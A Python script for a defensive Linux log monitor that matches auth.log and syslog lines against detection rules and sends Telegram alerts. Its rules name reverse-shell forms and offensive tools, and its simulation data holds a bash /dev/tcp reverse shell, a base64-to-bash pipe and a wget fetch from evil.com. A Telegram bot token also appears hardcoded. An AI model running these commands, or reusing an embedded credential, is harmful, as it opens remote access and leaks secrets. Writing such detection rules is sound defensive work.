#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║              SOC ALERT MONITOR + TELEGRAM BOT               ║
║                                                              ║
║  Real-time security event monitoring system for Linux/Kali   ║
║  Monitors auth.log & syslog, detects threats, and sends      ║
║  formatted alerts to Telegram in real-time.                  ║
║                                                              ║
║  Author: Itay Bechor — SOC Analyst Project                   ║
║  Platform: Kali Linux / Debian-based                         ║
╚══════════════════════════════════════════════════════════════╝

SETUP:
  pip3 install requests python-telegram-bot

RUN:
  sudo python3 soc_alert_monitor.py            # Real monitoring
  python3 soc_alert_monitor.py --simulate       # Test with fake events

DETECTION RULES:
  - SSH Brute Force (multiple failed logins)
  - Successful SSH Login
  - Sudo privilege escalation
  - New user / group creation
  - Suspicious commands (reverse shells, mimikatz, etc.)
  - Firewall / iptables changes
  - Cron job modifications
  - Service start/stop events
"""

import re
import os
import sys
import time
import json
import sqlite3
import signal
import hashlib
import requests
from datetime import datetime, timedelta
from pathlib import Path
from collections import defaultdict


# ╔══════════════════════════════════════════════════════════════╗
# ║                    CONFIGURATION                            ║
# ╚══════════════════════════════════════════════════════════════╝

# --- Telegram Settings ---
TELEGRAM_BOT_TOKEN = "8771708590:AAHcCl5360nKgmH3LnR1gaCY_MvnBQVxe74"
TELEGRAM_CHAT_ID = "5330083132"

# --- Log Files to Monitor ---
LOG_FILES = [
    "/var/log/auth.log",
    "/var/log/syslog",
]

# --- Database ---
DB_PATH = os.path.expanduser("~/soc_alerts.db")

# --- Thresholds ---
BRUTE_FORCE_THRESHOLD = 5          # Failed logins before alert
BRUTE_FORCE_WINDOW_SEC = 300       # Time window (5 min)
SCAN_THRESHOLD = 10                # Connection attempts before port scan alert
SCAN_WINDOW_SEC = 60               # Time window (1 min)
ALERT_COOLDOWN_SEC = 120           # Don't repeat same alert within 2 min

# --- Severity Emojis ---
SEVERITY_EMOJI = {
    "CRITICAL": "🔴",
    "HIGH": "🟠",
    "MEDIUM": "🟡",
    "LOW": "🟢",
    "INFO": "🔵",
}


# ╔══════════════════════════════════════════════════════════════╗
# ║                   DETECTION RULES                          ║
# ╚══════════════════════════════════════════════════════════════╝

DETECTION_RULES = [
    # --- Authentication Events ---
    {
        "name": "SSH Failed Login",
        "pattern": r"Failed password for (?:invalid user )?(\S+) from (\S+) port (\d+)",
        "severity": "MEDIUM",
        "description": "SSH authentication failure detected",
        "mitre": "T1110 - Brute Force",
        "log_file": "/var/log/auth.log",
        "aggregation": "brute_force",
    },
    {
        "name": "SSH Successful Login",
        "pattern": r"Accepted (?:password|publickey) for (\S+) from (\S+) port (\d+)",
        "severity": "INFO",
        "description": "Successful SSH authentication",
        "mitre": "T1078 - Valid Accounts",
        "log_file": "/var/log/auth.log",
    },
    {
        "name": "SSH Root Login",
        "pattern": r"Accepted (?:password|publickey) for root from (\S+) port (\d+)",
        "severity": "HIGH",
        "description": "Root user logged in via SSH — verify this is authorized",
        "mitre": "T1078.003 - Local Accounts",
        "log_file": "/var/log/auth.log",
    },
    # --- Privilege Escalation ---
    {
        "name": "Sudo Command Executed",
        "pattern": r"sudo:\s+(\S+)\s+:.*COMMAND=(.*)",
        "severity": "LOW",
        "description": "User executed command with sudo privileges",
        "mitre": "T1548.003 - Sudo and Sudo Caching",
        "log_file": "/var/log/auth.log",
    },
    {
        "name": "Sudo Auth Failure",
        "pattern": r"sudo:\s+(\S+)\s+:.*authentication failure",
        "severity": "HIGH",
        "description": "Failed sudo authentication — possible privilege escalation attempt",
        "mitre": "T1548.003 - Sudo and Sudo Caching",
        "log_file": "/var/log/auth.log",
    },
    {
        "name": "Su Command Used",
        "pattern": r"su:\s+\(to (\S+)\) (\S+) on",
        "severity": "MEDIUM",
        "description": "User switched to another account using su",
        "mitre": "T1548 - Abuse Elevation Control",
        "log_file": "/var/log/auth.log",
    },
    # --- User/Group Changes ---
    {
        "name": "New User Created",
        "pattern": r"useradd.*new user: name=(\S+),",
        "severity": "HIGH",
        "description": "A new user account was created on the system",
        "mitre": "T1136.001 - Local Account",
        "log_file": "/var/log/auth.log",
    },
    {
        "name": "User Deleted",
        "pattern": r"userdel.*delete user '(\S+)'",
        "severity": "HIGH",
        "description": "A user account was deleted",
        "mitre": "T1531 - Account Access Removal",
        "log_file": "/var/log/auth.log",
    },
    {
        "name": "Password Changed",
        "pattern": r"passwd.*password changed for (\S+)",
        "severity": "MEDIUM",
        "description": "User password was changed",
        "mitre": "T1098 - Account Manipulation",
        "log_file": "/var/log/auth.log",
    },
    {
        "name": "Group Membership Changed",
        "pattern": r"usermod.*add '(\S+)' to group '(\S+)'",
        "severity": "HIGH",
        "description": "User added to a group — check if sensitive group (sudo, root, wheel)",
        "mitre": "T1098 - Account Manipulation",
        "log_file": "/var/log/auth.log",
    },
    # --- Suspicious Commands in Syslog ---
    {
        "name": "Reverse Shell Detected",
        "pattern": r"(bash\s+-i\s+>&|nc\s+-e|ncat\s+-e|python.*socket.*connect|perl.*socket|ruby.*TCPSocket|php.*fsockopen|mkfifo.*nc\b)",
        "severity": "CRITICAL",
        "description": "Possible reverse shell command detected!",
        "mitre": "T1059 - Command and Scripting Interpreter",
        "log_file": "/var/log/syslog",
    },
    {
        "name": "Suspicious Tool Execution",
        "pattern": r"(mimikatz|lazagne|crackmapexec|bloodhound|sharphound|rubeus|impacket|psexec|wmiexec|smbexec|evil-winrm|chisel|ligolo)",
        "severity": "CRITICAL",
        "description": "Known offensive security tool detected!",
        "mitre": "T1003 - OS Credential Dumping",
        "log_file": "/var/log/syslog",
    },
    {
        "name": "Base64 Encoded Command",
        "pattern": r"(echo\s+\S+\s*\|\s*base64\s+-d|base64\s+-d.*\|\s*bash|python.*base64.*decode|powershell.*-enc)",
        "severity": "HIGH",
        "description": "Base64 encoded command execution — possible obfuscation",
        "mitre": "T1027 - Obfuscated Files",
        "log_file": "/var/log/syslog",
    },
    {
        "name": "Wget/Curl Download to /tmp",
        "pattern": r"(wget|curl).*(/tmp/|/dev/shm/|/var/tmp/)",
        "severity": "HIGH",
        "description": "File downloaded to temporary directory — possible payload staging",
        "mitre": "T1105 - Ingress Tool Transfer",
        "log_file": "/var/log/syslog",
    },
    # --- System Changes ---
    {
        "name": "Cron Job Modified",
        "pattern": r"crontab.*\((\S+)\)\s+(LIST|REPLACE|EDIT)",
        "severity": "MEDIUM",
        "description": "Cron job modification detected — verify scheduled tasks",
        "mitre": "T1053.003 - Cron",
        "log_file": "/var/log/syslog",
    },
    {
        "name": "Firewall Rule Changed",
        "pattern": r"(iptables|ufw|nftables|firewalld).*(-A|-D|-I|allow|deny|reject|drop)",
        "severity": "HIGH",
        "description": "Firewall rules were modified",
        "mitre": "T1562.004 - Disable/Modify Firewall",
        "log_file": "/var/log/syslog",
    },
    {
        "name": "Service State Change",
        "pattern": r"systemd.*:\s+(Started|Stopped|Reloaded)\s+(.*)\.",
        "severity": "LOW",
        "description": "System service state changed",
        "mitre": "T1543 - Create or Modify System Process",
        "log_file": "/var/log/syslog",
    },
    {
        "name": "SSH Config Changed",
        "pattern": r"sshd.*Received (SIGHUP|signal).*rereading",
        "severity": "HIGH",
        "description": "SSH daemon configuration was reloaded",
        "mitre": "T1098 - Account Manipulation",
        "log_file": "/var/log/auth.log",
    },
]


# ╔══════════════════════════════════════════════════════════════╗
# ║                   DATABASE MANAGER                         ║
# ╚══════════════════════════════════════════════════════════════╝

class AlertDatabase:
    """SQLite database for storing alert history."""

    def __init__(self, db_path):
        self.conn = sqlite3.connect(db_path)
        self.create_tables()

    def create_tables(self):
        self.conn.execute("""
            CREATE TABLE IF NOT EXISTS alerts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                rule_name TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                raw_log TEXT,
                source_file TEXT,
                mitre_technique TEXT,
                details TEXT,
                alert_hash TEXT UNIQUE
            )
        """)
        self.conn.commit()

    def insert_alert(self, alert):
        try:
            self.conn.execute("""
                INSERT INTO alerts
                (timestamp, rule_name, severity, description, raw_log,
                 source_file, mitre_technique, details, alert_hash)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                alert["timestamp"], alert["rule_name"], alert["severity"],
                alert["description"], alert["raw_log"], alert["source_file"],
                alert["mitre_technique"], json.dumps(alert.get("details", {})),
                alert["hash"],
            ))
            self.conn.commit()
            return True
        except sqlite3.IntegrityError:
            return False

    def get_stats_today(self):
        today = datetime.now().strftime("%Y-%m-%d")
        cursor = self.conn.execute(
            "SELECT severity, COUNT(*) FROM alerts WHERE DATE(timestamp) = ? GROUP BY severity",
            (today,))
        return dict(cursor.fetchall())

    def get_total_alerts(self):
        return self.conn.execute("SELECT COUNT(*) FROM alerts").fetchone()[0]

    def close(self):
        self.conn.close()


# ╔══════════════════════════════════════════════════════════════╗
# ║                  TELEGRAM ALERTER                          ║
# ╚══════════════════════════════════════════════════════════════╝

class TelegramAlerter:
    """Sends formatted security alerts to Telegram."""

    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.base_url = f"https://api.telegram.org/bot{token}"
        self.enabled = token != "YOUR_BOT_TOKEN_HERE"

    def send_alert(self, alert):
        """Send a formatted alert message to Telegram."""
        if not self.enabled:
            self._print_alert(alert)
            return False

        emoji = SEVERITY_EMOJI.get(alert["severity"], "⚪")
        hostname = os.uname().nodename

        message = (
            f"{emoji} *SOC ALERT — {alert['severity']}* {emoji}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📋 *Rule:* `{alert['rule_name']}`\n"
            f"🖥 *Host:* `{hostname}`\n"
            f"📁 *Source:* `{alert['source_file']}`\n"
            f"🕐 *Time:* `{alert['timestamp']}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📝 *Description:*\n{alert['description']}\n\n"
        )

        # Add matched details
        if alert.get("details"):
            message += "🔍 *Details:*\n"
            for key, value in alert["details"].items():
                message += f"  • `{key}`: `{value}`\n"
            message += "\n"

        # Add MITRE ATT&CK reference
        if alert.get("mitre_technique"):
            message += f"🛡 *MITRE ATT&CK:* `{alert['mitre_technique']}`\n\n"

        # Add recommendation
        message += f"💡 *Recommendation:*\n{self._get_recommendation(alert)}\n"
        message += f"━━━━━━━━━━━━━━━━━━━━━━\n"

        try:
            response = requests.post(
                f"{self.base_url}/sendMessage",
                json={
                    "chat_id": self.chat_id,
                    "text": message,
                    "parse_mode": "Markdown",
                    "disable_web_page_preview": True,
                },
                timeout=10,
            )
            if response.status_code == 200:
                print(f"  [✓] Telegram alert sent: {alert['rule_name']}")
                return True
            else:
                print(f"  [✗] Telegram error {response.status_code}: {response.text}")
                return False
        except Exception as e:
            print(f"  [✗] Telegram send failed: {e}")
            self._print_alert(alert)
            return False

    def send_startup_message(self):
        """Send a startup notification."""
        if not self.enabled:
            return
        hostname = os.uname().nodename
        message = (
            f"🟢 *SOC Monitor Started*\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🖥 Host: `{hostname}`\n"
            f"🕐 Time: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
            f"📂 Monitoring: `{len(LOG_FILES)} log files`\n"
            f"📏 Rules loaded: `{len(DETECTION_RULES)}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ All systems operational"
        )
        try:
            requests.post(
                f"{self.base_url}/sendMessage",
                json={"chat_id": self.chat_id, "text": message, "parse_mode": "Markdown"},
                timeout=10,
            )
        except Exception:
            pass

    def send_daily_summary(self, db):
        """Send daily statistics summary."""
        if not self.enabled:
            return
        stats = db.get_stats_today()
        total = db.get_total_alerts()
        message = (
            f"📊 *Daily SOC Summary*\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📅 Date: `{datetime.now().strftime('%Y-%m-%d')}`\n\n"
            f"🔴 Critical: `{stats.get('CRITICAL', 0)}`\n"
            f"🟠 High: `{stats.get('HIGH', 0)}`\n"
            f"🟡 Medium: `{stats.get('MEDIUM', 0)}`\n"
            f"🟢 Low: `{stats.get('LOW', 0)}`\n"
            f"🔵 Info: `{stats.get('INFO', 0)}`\n\n"
            f"📈 Total alerts (all time): `{total}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━"
        )
        try:
            requests.post(
                f"{self.base_url}/sendMessage",
                json={"chat_id": self.chat_id, "text": message, "parse_mode": "Markdown"},
                timeout=10,
            )
        except Exception:
            pass

    def _get_recommendation(self, alert):
        """Generate a response recommendation based on the alert type."""
        recommendations = {
            "SSH Failed Login": "Monitor for brute force patterns. Consider fail2ban.",
            "SSH Brute Force": "⚠️ Block the source IP immediately!\n  `sudo iptables -A INPUT -s {ip} -j DROP`",
            "SSH Successful Login": "Verify this is an authorized session.",
            "SSH Root Login": "⚠️ Root SSH login is risky. Disable in sshd_config.",
            "Sudo Command Executed": "Review if the command is authorized.",
            "Sudo Auth Failure": "⚠️ Investigate — possible privilege escalation attempt.",
            "New User Created": "⚠️ Verify this user creation was authorized.",
            "User Deleted": "Confirm this was an authorized administrative action.",
            "Password Changed": "Verify the password change was requested.",
            "Reverse Shell Detected": "🚨 INCIDENT! Isolate the host immediately!",
            "Suspicious Tool Execution": "🚨 INCIDENT! Known attack tool detected — contain now!",
            "Base64 Encoded Command": "⚠️ Decode and analyze the obfuscated command.",
            "Wget/Curl Download to /tmp": "⚠️ Check what was downloaded and scan for malware.",
            "Firewall Rule Changed": "Review the change — could be defense evasion.",
            "Cron Job Modified": "Check for persistence mechanisms.",
        }
        default = "Investigate this event and document findings."
        rec = recommendations.get(alert["rule_name"], default)
        if alert.get("details") and "{ip}" in rec:
            rec = rec.replace("{ip}", alert["details"].get("source_ip", "UNKNOWN"))
        return rec

    def _print_alert(self, alert):
        """Print alert to console when Telegram is not configured."""
        emoji = SEVERITY_EMOJI.get(alert["severity"], "⚪")
        print(f"\n{'='*60}")
        print(f"  {emoji} ALERT: {alert['rule_name']} [{alert['severity']}]")
        print(f"  Time: {alert['timestamp']}")
        print(f"  {alert['description']}")
        if alert.get("details"):
            for k, v in alert["details"].items():
                print(f"  {k}: {v}")
        if alert.get("mitre_technique"):
            print(f"  MITRE: {alert['mitre_technique']}")
        print(f"{'='*60}\n")


# ╔══════════════════════════════════════════════════════════════╗
# ║                  SOC MONITOR ENGINE                        ║
# ╚══════════════════════════════════════════════════════════════╝

class SOCMonitor:
    """Main monitoring engine — tails logs, applies rules, fires alerts."""

    def __init__(self):
        self.db = AlertDatabase(DB_PATH)
        self.telegram = TelegramAlerter(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)
        self.file_positions = {}
        self.failed_logins = defaultdict(list)
        self.connection_tracker = defaultdict(list)
        self.alert_cooldown = {}
        self.running = True
        self.alerts_sent = 0
        self.lines_processed = 0

    def start(self):
        """Initialize and start monitoring."""
        self._print_banner()
        self._check_permissions()
        self._init_file_positions()
        self.telegram.send_startup_message()

        print(f"\n[*] Monitoring started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"[*] Watching {len(LOG_FILES)} log files with {len(DETECTION_RULES)} detection rules")
        print(f"[*] Database: {DB_PATH}")
        if self.telegram.enabled:
            print(f"[*] Telegram alerts: ENABLED ✓")
        else:
            print(f"[!] Telegram alerts: DISABLED (set token and chat_id)")
        print(f"[*] Press Ctrl+C to stop\n")

        try:
            last_summary = datetime.now()
            while self.running:
                for log_file in LOG_FILES:
                    self._process_log(log_file)
                if (datetime.now() - last_summary).total_seconds() > 86400:
                    self.telegram.send_daily_summary(self.db)
                    last_summary = datetime.now()
                time.sleep(1)
        except KeyboardInterrupt:
            self._shutdown()

    def _process_log(self, log_file):
        """Read new lines from a log file and apply detection rules."""
        if not os.path.exists(log_file):
            return
        try:
            with open(log_file, "r", errors="ignore") as f:
                f.seek(self.file_positions.get(log_file, 0))
                new_lines = f.readlines()
                self.file_positions[log_file] = f.tell()
            for line in new_lines:
                self.lines_processed += 1
                line = line.strip()
                if not line:
                    continue
                for rule in DETECTION_RULES:
                    if rule.get("log_file") and rule["log_file"] != log_file:
                        continue
                    match = re.search(rule["pattern"], line, re.IGNORECASE)
                    if match:
                        self._handle_match(rule, match, line, log_file)
        except PermissionError:
            pass
        except Exception as e:
            print(f"  [!] Error reading {log_file}: {e}")

    def _handle_match(self, rule, match, raw_log, source_file):
        """Process a rule match — handle aggregation or send alert."""
        groups = match.groups()
        details = {}

        if rule.get("aggregation") == "brute_force":
            username = groups[0] if len(groups) > 0 else "unknown"
            source_ip = groups[1] if len(groups) > 1 else "unknown"
            port = groups[2] if len(groups) > 2 else "unknown"
            now = time.time()
            self.failed_logins[source_ip].append(now)
            self.failed_logins[source_ip] = [
                t for t in self.failed_logins[source_ip]
                if now - t < BRUTE_FORCE_WINDOW_SEC
            ]
            count = len(self.failed_logins[source_ip])
            if count >= BRUTE_FORCE_THRESHOLD:
                alert = self._build_alert(
                    rule_name="SSH Brute Force",
                    severity="CRITICAL",
                    description=f"🚨 {count} failed SSH logins from {source_ip} in {BRUTE_FORCE_WINDOW_SEC//60} min!",
                    raw_log=raw_log,
                    source_file=source_file,
                    mitre="T1110.001 - Password Guessing",
                    details={
                        "source_ip": source_ip,
                        "target_user": username,
                        "attempts": str(count),
                        "window": f"{BRUTE_FORCE_WINDOW_SEC//60} minutes",
                    },
                )
                self._fire_alert(alert)
                self.failed_logins[source_ip] = []
                return
            details = {"target_user": username, "source_ip": source_ip, "port": port}

        elif rule["name"] in ("SSH Successful Login", "SSH Root Login"):
            details = {
                "user": groups[0] if len(groups) > 0 else "unknown",
                "source_ip": groups[1] if len(groups) > 1 else "unknown",
                "port": groups[2] if len(groups) > 2 else "unknown",
            }
        elif rule["name"] == "Sudo Command Executed":
            details = {
                "user": groups[0] if len(groups) > 0 else "unknown",
                "command": groups[1][:200] if len(groups) > 1 else "unknown",
            }
        elif rule["name"] == "New User Created":
            details = {"new_user": groups[0] if groups else "unknown"}
        elif rule["name"] == "Cron Job Modified":
            details = {
                "user": groups[0] if len(groups) > 0 else "unknown",
                "action": groups[1] if len(groups) > 1 else "unknown",
            }
        elif rule["name"] == "Service State Change":
            details = {
                "action": groups[0] if len(groups) > 0 else "unknown",
                "service": groups[1] if len(groups) > 1 else "unknown",
            }
        elif rule["name"] in ("Reverse Shell Detected", "Suspicious Tool Execution",
                               "Base64 Encoded Command", "Wget/Curl Download to /tmp"):
            details = {"matched_pattern": groups[0][:150] if groups else "unknown"}

        alert = self._build_alert(
            rule_name=rule["name"],
            severity=rule["severity"],
            description=rule["description"],
            raw_log=raw_log,
            source_file=source_file,
            mitre=rule.get("mitre", ""),
            details=details,
        )
        self._fire_alert(alert)

    def _build_alert(self, rule_name, severity, description, raw_log,
                     source_file, mitre="", details=None):
        """Construct an alert dictionary."""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        alert_hash = hashlib.md5(
            f"{rule_name}{json.dumps(details or {})}{int(time.time()) // ALERT_COOLDOWN_SEC}".encode()
        ).hexdigest()
        return {
            "timestamp": timestamp,
            "rule_name": rule_name,
            "severity": severity,
            "description": description,
            "raw_log": raw_log[:500],
            "source_file": source_file,
            "mitre_technique": mitre,
            "details": details or {},
            "hash": alert_hash,
        }

    def _fire_alert(self, alert):
        """Send alert if not in cooldown, save to DB."""
        alert_hash = alert["hash"]
        now = time.time()
        if alert_hash in self.alert_cooldown:
            if now - self.alert_cooldown[alert_hash] < ALERT_COOLDOWN_SEC:
                return
        self.alert_cooldown[alert_hash] = now
        self.db.insert_alert(alert)
        self.telegram.send_alert(alert)
        self.alerts_sent += 1
        emoji = SEVERITY_EMOJI.get(alert["severity"], "⚪")
        print(f"  {emoji} [{alert['severity']}] {alert['rule_name']} — {alert['timestamp']}")

    def _init_file_positions(self):
        """Set initial file positions to end of file."""
        for log_file in LOG_FILES:
            if os.path.exists(log_file):
                try:
                    self.file_positions[log_file] = os.path.getsize(log_file)
                    print(f"  [✓] Watching: {log_file}")
                except PermissionError:
                    print(f"  [✗] No permission: {log_file} (run with sudo)")
            else:
                print(f"  [~] Not found: {log_file} (skipped)")

    def _check_permissions(self):
        if os.geteuid() != 0:
            print("\n[!] WARNING: Not running as root.")
            print("[!] Run with: sudo python3 soc_alert_monitor.py\n")

    def _print_banner(self):
        print("""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║      🛡️  SOC ALERT MONITOR v1.0  🛡️                         ║
║      Real-Time Security Event Detection                      ║
║      + Telegram Alerts                                       ║
║      Author: Itay Bechor                                     ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
        """)

    def _shutdown(self):
        print(f"\n\n[*] Shutting down SOC Monitor...")
        print(f"[*] Lines processed: {self.lines_processed}")
        print(f"[*] Alerts sent: {self.alerts_sent}")
        print(f"[*] Total alerts in DB: {self.db.get_total_alerts()}")
        self.telegram.send_daily_summary(self.db)
        self.db.close()
        print(f"[*] Goodbye! Stay safe. 🛡️\n")
        sys.exit(0)


# ╔══════════════════════════════════════════════════════════════╗
# ║                    SIMULATION MODE                         ║
# ╚══════════════════════════════════════════════════════════════╝

def run_simulation():
    """Simulate security events for testing."""
    print("\n🧪 SIMULATION MODE — Generating fake security events for testing...\n")

    sim_log = "/tmp/soc_sim_auth.log"
    sim_syslog = "/tmp/soc_sim_syslog.log"

    global LOG_FILES
    LOG_FILES = [sim_log, sim_syslog]

    for rule in DETECTION_RULES:
        if rule.get("log_file") == "/var/log/auth.log":
            rule["log_file"] = sim_log
        elif rule.get("log_file") == "/var/log/syslog":
            rule["log_file"] = sim_syslog

    Path(sim_log).touch()
    Path(sim_syslog).touch()

    monitor = SOCMonitor()
    monitor._print_banner()
    monitor._init_file_positions()
    monitor.telegram.send_startup_message()

    print(f"\n[*] Simulation started — writing events in 3 seconds...\n")
    time.sleep(3)

    sim_events_auth = [
        "Apr  4 10:01:01 kali sshd[1234]: Failed password for invalid user admin from 192.168.1.100 port 4444 ssh2",
        "Apr  4 10:01:02 kali sshd[1235]: Failed password for invalid user admin from 192.168.1.100 port 4445 ssh2",
        "Apr  4 10:01:03 kali sshd[1236]: Failed password for invalid user root from 192.168.1.100 port 4446 ssh2",
        "Apr  4 10:01:04 kali sshd[1237]: Failed password for invalid user test from 192.168.1.100 port 4447 ssh2",
        "Apr  4 10:01:05 kali sshd[1238]: Failed password for invalid user admin from 192.168.1.100 port 4448 ssh2",
        "Apr  4 10:02:00 kali sshd[1240]: Accepted password for itay from 10.0.0.50 port 5555 ssh2",
        "Apr  4 10:03:00 kali sshd[1250]: Accepted password for root from 203.0.113.42 port 6666 ssh2",
        "Apr  4 10:04:00 kali sudo:    itay : TTY=pts/0 ; PWD=/home/itay ; USER=root ; COMMAND=/bin/cat /etc/shadow",
        "Apr  4 10:05:00 kali sudo:    hacker : authentication failure ; TTY=pts/1 ; PWD=/tmp ; USER=root",
        "Apr  4 10:06:00 kali useradd[2000]: new user: name=backdoor, UID=1001, GID=1001",
        "Apr  4 10:07:00 kali passwd[2100]: password changed for backdoor",
    ]

    sim_events_syslog = [
        "Apr  4 10:08:00 kali bash[3000]: bash -i >& /dev/tcp/10.10.14.1/9001 0>&1",
        "Apr  4 10:09:00 kali python3[3100]: Running mimikatz module for credential extraction",
        "Apr  4 10:10:00 kali bash[3200]: echo aWQgLW4= | base64 -d | bash",
        "Apr  4 10:11:00 kali wget[3300]: wget http://evil.com/payload.sh -O /tmp/update.sh",
        "Apr  4 10:12:00 kali crontab[3400]: (hacker) REPLACE (hacker)",
        "Apr  4 10:13:00 kali iptables[3500]: iptables -A INPUT -p tcp --dport 4444 -j ACCEPT",
        "Apr  4 10:14:00 kali systemd[1]: Started Apache HTTP Server.",
    ]

    print("[*] Writing simulated auth.log events...")
    with open(sim_log, "a") as f:
        for event in sim_events_auth:
            f.write(event + "\n")
            f.flush()

    print("[*] Writing simulated syslog events...")
    with open(sim_syslog, "a") as f:
        for event in sim_events_syslog:
            f.write(event + "\n")
            f.flush()

    time.sleep(1)
    for log_file in LOG_FILES:
        monitor._process_log(log_file)

    print(f"\n{'='*60}")
    print(f"  🧪 Simulation Complete!")
    print(f"  Lines processed: {monitor.lines_processed}")
    print(f"  Alerts generated: {monitor.alerts_sent}")
    print(f"  Total in database: {monitor.db.get_total_alerts()}")
    print(f"{'='*60}")

    monitor.db.close()
    os.remove(sim_log)
    os.remove(sim_syslog)


# ╔══════════════════════════════════════════════════════════════╗
# ║                       MAIN                                 ║
# ╚══════════════════════════════════════════════════════════════╝

if __name__ == "__main__":
    def signal_handler(sig, frame):
        print("\n[*] Caught interrupt signal...")
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    if len(sys.argv) > 1 and sys.argv[1] == "--simulate":
        run_simulation()
    else:
        monitor = SOCMonitor()
        monitor.start()
